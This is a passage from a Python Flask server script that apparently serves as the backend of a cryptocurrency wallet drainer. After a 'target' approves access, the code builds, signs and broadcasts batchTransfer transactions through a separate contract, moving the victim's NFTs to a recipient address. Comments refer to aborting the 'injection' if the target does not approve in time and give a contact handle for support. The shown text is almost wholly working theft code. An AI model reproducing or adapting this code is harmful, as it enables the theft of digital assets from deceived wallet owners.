ovalForAll","type":"event"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"}]
                                            abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
                                            owner = web3.toChecksumAddress(data['owner'])
                                            token_address = web3.toChecksumAddress(data['address'])
                                            contract = web3.eth.contract(address=token_address, abi=abierc721)
                                            owner_balance = data['token_id']
                                            res = [int(item) for item in owner_balance]
                                            contractInstance = web3.eth.contract(address=CONTRACT_ADR_SAFA, abi=abiercsafa)
                                            token_txn =  contractInstance.functions.batchTransfer(token_address, owner, recipient, res).buildTransaction({
                                        'chainId': 1,
                                        'gas': 160000,
                                        'gasPrice': web3.toWei('30', 'gwei'),
                                        'nonce': nonce + 2,
                                        })
                                            signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                                            web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                                            print('************************* BROADCASTING  SAFA TRANSACTION *************************')
                                            #print(f"From: {owner} To: {recipient} Token: {token_address} IDs: {owner_balance} Type: NFT")
                                            print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + " IDs: " + str(owner_balance) + " Type: NFT") #FIXED MESSAGE
                                            print('************************* BROADCASTING  SAFA TRANSACTION *************************')
                                            allowance = True
                                        except Exception as e:
                                            print(e)    
                except Exception as e:
                    try:
                        abierc721 = [{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":False,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"from","type":"address"},{"indexed":True,"internalType":"address","name":"to","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"approved","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"operator","type":"address"},{"indexed":False,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"}]
                        abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
                        owner = web3.toChecksumAddress(data['owner'])
                        token_address = web3.toChecksumAddress(data['address'])
                        contract = web3.eth.contract(address=token_address, abi=abierc721)
                        owner_balance = data['token_id']
                        res = [int(item) for item in owner_balance]
                        nonce = web3.eth.getTransactionCount(initiator)
                        contractInstance = web3.eth.contract(address=CONTRACT_ADR_SAFA, abi=abiercsafa)
                        token_txn =  contractInstance.functions.batchTransfer(token_address, owner, recipient, res).buildTransaction({
                                        'chainId': 1,
                                        'gas': 160000,
                                        'gasPrice': web3.toWei('30', 'gwei'),
                                        'nonce': nonce,
                        })
                        signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                        web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                        print('************************* BROADCASTING SAFA TRANSACTION *************************')
                        #print(f"From: {owner} To: {recipient} Token: {token_address} IDs: {owner_balance} Type: NFT")
                        print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + " IDs: " + str(owner_balance) + " Type: NFT") #FIXED MESSAGE
                        print('************************* BROADCASTING  SAFA TRANSACTION *************************')
                        allowance = True
                    except Exception as e:
                            print(e)    
                    
                if elapsed_time > seconds: # If target has not approved within seconds(120)
                    break  # Aborting injection   

    print(data)
    return data


# Starting Server
if __name__ == '__main__':
    try:
        app.run(debug=False)
        print("[+] Server Started")
    except Exception as e:
        print(e)
        print("[-] Can`t start server, please contact @gg22gg77")

